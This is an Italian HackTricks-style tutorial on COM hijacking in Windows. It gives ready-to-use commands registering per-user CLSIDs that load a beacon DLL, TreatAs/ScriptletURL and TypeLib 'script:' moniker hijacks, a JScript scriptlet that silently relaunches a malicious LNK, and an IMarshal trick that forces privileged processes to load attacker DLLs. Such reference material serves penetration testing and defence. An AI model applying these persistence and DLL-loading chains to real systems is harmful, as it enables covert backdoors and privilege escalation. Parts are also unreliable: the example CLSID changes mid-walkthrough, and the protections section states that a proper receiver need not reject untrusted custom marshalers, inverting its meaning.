# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Ricerca di componenti COM inesistenti

Poiché gli utenti possono modificare i valori di HKCU, **COM Hijacking** può essere usato come **meccanismo di persistenza**. Con `procmon` è facile individuare le chiavi di registro COM cercate ma inesistenti, che potrebbero essere create da un attacker. Filtri classici:

- Operazioni **RegOpenKey**.
- dove il _Result_ è **NAME NOT FOUND**.
- e il _Path_ termina con **InprocServer32**.

Varianti utili durante la ricerca:

- Cerca anche le chiavi **`LocalServer32`** mancanti. Alcune classi COM sono server out-of-process e avviano un EXE controllato dall’attacker invece di una DLL.
- Cerca le operazioni di registro **`TreatAs`** e **`ScriptletURL`**, oltre a `InprocServer32`. Le analisi recenti e gli articoli sui malware continuano a segnalarle perché sono molto più rare delle normali registrazioni COM e quindi costituiscono indicatori ad alta affidabilità.
- Quando cloni una registrazione in HKCU, copia il valore legittimo di **`ThreadingModel`** da `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Un modello errato spesso impedisce l’attivazione e rende l’hijack facilmente rilevabile.<sup>[[3]](#references)</sup>
- Nei sistemi a 64 bit, controlla entrambe le viste, a 64 e 32 bit (`procmon.exe` e `procmon64.exe`, `HKLM\Software\Classes` e `HKLM\Software\Classes\WOW6432Node`), perché le applicazioni a 32 bit potrebbero risolvere una registrazione COM diversa.

Dopo aver scelto quale COM inesistente impersonare, esegui i seguenti comandi. _Fai attenzione: impersonare una COM caricata ogni pochi secondi potrebbe essere eccessivo._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Componenti COM dell'Utilità di pianificazione delle attività vulnerabili al hijacking

Le attività di Windows usano trigger personalizzati per richiamare oggetti COM e, poiché vengono eseguite tramite l'Utilità di pianificazione, è più facile prevedere quando verranno attivati.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Esaminando l'output, puoi selezionare, ad esempio, un'attività che viene eseguita **ogni volta che un utente effettua l'accesso**.

Cercando quindi il CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID**, in HKLM e in HKCU, di solito scoprirai che il valore non esiste in HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Quindi, puoi semplicemente creare la voce HKCU e ogni volta che l'utente effettua l'accesso, verrà eseguito il tuo backdoor.

## Registrazioni COM orfane e marshaling personalizzato

Una registrazione COM a livello di macchina può diventare una primitiva di DLL planting senza modificare il registro. Cerca un valore `InprocServer32` la cui DLL non è presente e il cui percorso finale può essere creato o modificato da un utente con privilegi bassi. Piantare una DLL con il nome esatto farà sì che qualsiasi processo che attiva il CLSID carichi codice dell'attaccante. Nell'esempio CrossDevice, il percorso registrato era `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, quindi un utente standard poteva creare la directory figlia e la DLL mancanti.<sup>[[5]](#references)</sup>

### `IMarshal` come primitiva per il caricamento di DLL tra processi

COM normalmente rappresenta un puntatore a un'interfaccia con un `OBJREF` standard che rimanda il ricevente all'oggetto originale. Un oggetto che implementa `IMarshal` può invece produrre un `OBJREF` personalizzato. Il suo metodo `GetUnmarshalClass` fornisce il CLSID del codice che ricostruirà l'oggetto nel processo ricevente. Quel CLSID non deve identificare l'oggetto originale. COM lo risolve come server in-process e carica la DLL registrata prima di invocare il metodo dell'interfaccia richiesto.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Un'implementazione malevola minimale deve solo sostituire il CLSID orfano in `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Invia questo oggetto tramite un parametro di un metodo proxy, ad esempio `[in] IUnknown *`. Un'altra opzione è `CoGetInstanceFromIStorage`, con l'oggetto sottoposto a custom marshaling che implementa anche una parte sufficiente di `IStorage` per superare i controlli locali. L'unmarshaling automatico nel server remoto risolve il CLSID sostituito, quindi il caricamento della DLL avviene prima dell'esecuzione del metodo di destinazione.<sup>[[5]](#references)</sup>

Questa primitiva non si limita alle registrazioni mancanti. Può anche forzare il ricevente a caricare una DLL di custom-unmarshaler esistente ed esporre bug nel suo percorso di caricamento o di unmarshaling.<sup>[[5]](#references)</sup>

La catena richiede tutte le seguenti condizioni:<sup>[[5]](#references)</sup>

1. Un CLSID visibile a livello di macchina punta a una DLL in-process mancante o sostituibile.
2. L'attaccante può collocare quella DLL nel percorso risolto.
3. Un server COM out-of-process attivabile viene eseguito con il livello di privilegi desiderato.
4. Il server accetta il custom marshaling ed espone una chiamata proxy che trasporta l'oggetto dell'attaccante oltre il confine tra processi.

### Individuare server in-process orfani

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) e [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) possono enumerare il database COM della macchina e verificare ogni server tramite la normale risoluzione dei moduli Win32. Questo è preferibile a `Test-Path`, perché alcune registrazioni contengono solo un nome file e si affidano al percorso di ricerca del loader.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Tratta il risultato come un elenco di candidati, non come prova di sfruttabilità. Risolvi il percorso come farebbe il loader, quindi controlla la DACL del primo genitore esistente e della DLL prevista, se esiste già. Un file mancante è utile solo se l'attaccante può creare o sostituire il percorso che COM risolverà effettivamente.<sup>[[5]](#references)</sup>

### Seleziona e avvia un ricevitore con privilegi

Esamina le classi COM candidate per verificare `RunAs`, l'associazione a un servizio, le interfacce disponibili e i proxy RPC. Una classe configurata per `SYSTEM` ma non supportata da un servizio con nome potrebbe non attivarsi direttamente perché RPCSS non riesce ad avviarla. In tal caso, cerca un trigger non privilegiato che avvii il suo host, per esempio un'attività pianificata eseguibile, e riproduci qualsiasi prerequisito relativo a un evento con nome o all'IPC che mantiene attivo il server.<sup>[[5]](#references)</sup>

Per esempio, la catena vulnerabile Shell Create Object Handler avviava il suo host creando l'evento globale previsto prima di richiamare un'attività pianificata eseguibile dall'utente.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Ricollega il riferimento all'oggetto risultante al relativo host e verifica sia l'identità sia la policy di marshaling. Quindi enumera le interfacce e converti i relativi proxy in IDL per trovare un parametro di input come `IUnknown *` che esegua il marshaling dell'oggetto falso.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Protezioni contro il custom marshaling

Un ricevitore adeguato non deve rifiutare i custom marshaler non attendibili. Due protezioni a livello di processo sono `EOAC_NO_CUSTOM_MARSHAL` nelle capabilities passate a `CoInitializeSecurity` e `COMGLB_UNMARSHALING_POLICY_STRONG`, impostato tramite `IGlobalOptions::Set`. Se sono disponibili i simboli, lo stato corrispondente può essere esaminato in `combase!gCapabilities` e `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager espone il risultato come `CustomMarshalAllowed` quando il parser del processo supporta la build di Windows.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` consente a un CLSID di essere emulato da un altro.<sup>[[4]](#references)</sup> Dal punto di vista offensivo, questo significa che puoi lasciare invariato il CLSID originale, creare un secondo CLSID per-utente che punta a `scrobj.dll` e poi reindirizzare il vero oggetto COM a quello malevolo con `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

È utile quando:

- l'applicazione bersaglio istanzia già un CLSID stabile all'accesso o all'avvio dell'app
- vuoi un reindirizzamento limitato al registro invece di sostituire l'`InprocServer32` originale
- vuoi eseguire uno scriptlet `.sct` locale o remoto tramite il valore `ScriptletURL`

Flusso di lavoro di esempio (adattato alle tecniche pubbliche di Atomic Red Team e a ricerche precedenti sull'abuso del registro COM):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Note:

- `scrobj.dll` legge il valore `ScriptletURL` ed esegue il file `.sct` a cui fa riferimento, quindi puoi mantenere il payload come file locale o recuperarlo in remoto tramite HTTP/HTTPS.
- `TreatAs` è particolarmente utile quando la registrazione COM originale è completa e stabile in HKLM, perché basta un piccolo redirect per utente invece di replicare l'intero albero.
- Per la convalida senza aspettare il trigger naturale, puoi istanziare manualmente il ProgID/CLSID fittizio con `rundll32.exe -sta <ProgID-or-CLSID>` se la classe di destinazione supporta l'attivazione STA.

## COM TypeLib Hijacking (script: moniker persistence)

Le Type Library (TypeLib) definiscono le interfacce COM e vengono caricate tramite `LoadTypeLib()`. Quando viene istanziato un server COM, il sistema operativo può caricare anche la TypeLib associata consultando le chiavi del registro in `HKCR\TypeLib\{LIBID}`. Se il percorso della TypeLib viene sostituito con un **moniker**, ad esempio `script:C:\...\evil.sct`, Windows esegue lo scriptlet quando viene risolta la TypeLib, ottenendo così una persistenza furtiva che si attiva quando vengono utilizzati componenti comuni.

Questo comportamento è stato osservato con il controllo Microsoft Web Browser (caricato spesso da Internet Explorer, dalle app che integrano WebBrowser e persino da `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Passaggi (PowerShell)

1) Identifica la TypeLib (LIBID) utilizzata da un CLSID ad alta frequenza. Esempio di CLSID spesso sfruttato nelle catene malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Indirizza il percorso TypeLib per utente a uno scriptlet locale usando il moniker `script:` (non sono necessari diritti di amministratore):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Crea un file JScript `.sct` minimale che rilanci il payload principale (ad es. un `.lnk` usato nella catena iniziale):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Attivazione – aprire IE, un'applicazione che incorpora il controllo WebBrowser o anche una normale attività di Explorer caricherà la TypeLib ed eseguirà lo scriptlet, riarmando la catena all'accesso/riavvio.

Pulizia
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Note
- Puoi applicare la stessa logica ad altri componenti COM ad alta frequenza; risolvi sempre prima il `LIBID` effettivo da `HKCR\CLSID\{CLSID}\TypeLib`.
- Sui sistemi a 64 bit puoi anche popolare la sottochiave `win64` per i consumer a 64 bit.

## References

- [1] [Dirottare la TypeLib – Nuova tecnica di persistenza COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – Campagna ZipLine: un sofisticato attacco di phishing rivolto alle aziende statunitensi](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Riesaminare il COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Chiave CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Tecniche di exploitation di Windows: registrazioni di oggetti COM dangling](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - interfaccia IMarshal](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - OBJREF di MS-DCOM](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
{{#include ../../banners/hacktricks-training.md}}

